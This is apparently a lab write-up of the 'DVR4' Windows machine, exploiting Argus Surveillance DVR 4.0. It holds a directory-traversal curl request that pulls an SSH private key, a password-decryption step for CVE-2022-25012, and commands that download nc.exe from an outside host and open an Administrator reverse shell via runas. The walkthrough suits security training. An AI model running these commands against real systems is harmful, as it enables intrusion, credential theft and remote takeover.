#Windows #DirectoryTraversal #CVE-2018-15745 #WeakEncryption #CVE-2022-25012 #SSH #runas

## Overview

DVR4 is a Windows machine running Argus Surveillance DVR 4.0, which is vulnerable to two separate CVEs. A directory traversal (CVE-2018-15745) leaks an SSH private key for initial access, and a weak password encryption flaw (CVE-2022-25012) decrypts administrator credentials stored in the application's config file. With cleartext admin credentials in hand, `runas` spawns a reverse shell as Administrator without ever touching a traditional exploit.

## Recon

### Nmap

```sh
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh
8080/tcp open  http
3389/tcp open  ms-wbt-server
```

Port 8080 serves the Argus DVR web interface. An `/about.php` page confirms the exact version:

```
Argus Surveillance DVR
Version: 4.0
Released 18/12/2008
```

Searchsploit returns two hits for this version:
- **CVE-2018-15745**, Directory Traversal (EDB-45296)
- **CVE-2022-25012**, Weak Password Encryption (EDB-50130)

## Foothold

### Directory Traversal to SSH Key (CVE-2018-15745)

The DVR control panel shows a user named `viewer`. The traversal vulnerability allows reading arbitrary files from the system by encoding `../` sequences in a `RESULTPAGE` parameter. Targeting the SSH private key directly:

```sh
curl "http://192.168.180.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

The response returns `viewer`'s full RSA private key.

> **Why traversal gives SSH keys:** the DVR web process runs with enough filesystem access to serve files outside its web root. The `RESULTPAGE` parameter was designed to redirect to application pages, but without sanitization it accepts absolute paths encoded as traversal sequences. The attacker specifies the path, the server reads it, and the response body contains the file contents.

Using the recovered key:

```sh
ssh -i id_rsa viewer@192.168.180.179
Microsoft Windows [Version 10.0.19044.1645]

C:\Users\viewer> whoami
dvr4\viewer
```

Local flag:

```powershell
C:\Users\viewer\Desktop> type local.txt
‹redacted›
```

## Privilege Escalation

### Weak Password Encryption (CVE-2022-25012)

The Argus DVR stores application passwords in `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`. As `viewer`, this file is readable. It contains two hashed admin passwords:

```
ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
```

EDB-50130 decrypts Argus's proprietary cipher, which operates on two-byte blocks. The original script fails on special characters; the updated version from GitHub (CVE-2022-25012) handles the full character set:

```sh
python3 arg.py ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
[+] Password: ‹redacted›
```

> **Why this encryption is "weak":** Argus uses a static lookup table keyed on two-byte hex chunks. There's no salt, no iteration count, and the mapping is fixed, the same plaintext always produces the same ciphertext. Any attacker with the INI file and the lookup table (published in the CVE PoC) can reverse every password in seconds. It's not encryption in any security-meaningful sense; it's obfuscation with a published key.

### runas to Administrator

With the administrator plaintext password, `runas` executes any command as Administrator without needing an interactive logon. Transferring nc.exe and using `runas` to spawn a reverse shell:

```powershell
iwr -uri http://192.168.45.244/nc.exe -OutFile nc.exe
runas /user:administrator ".\nc.exe -e cmd.exe 192.168.45.244 443"
```

## Root / SYSTEM

```sh
rlwrap nc -lvnp 443
connect to [...] from (UNKNOWN) [192.168.180.179] 50400

C:\WINDOWS\system32> whoami
dvr4\administrator
```

```powershell
C:\Users\Administrator\Desktop> type proof.txt
‹redacted›
```

## Takeaways

- **Enumerate application users from the UI before exploiting.** The control panel revealed the `viewer` username, which made the traversal path precise rather than a blind guess.
- **Two CVEs for the same product, two different primitives.** The traversal gave initial access; the weak encryption gave privilege. Check searchsploit for every version string you find, one product can have multiple useful bugs.
- **`runas` is a clean privesc when you have plaintext creds.** No exploit needed, no AV trigger, no new process injection. The OS itself runs the payload as the target user.
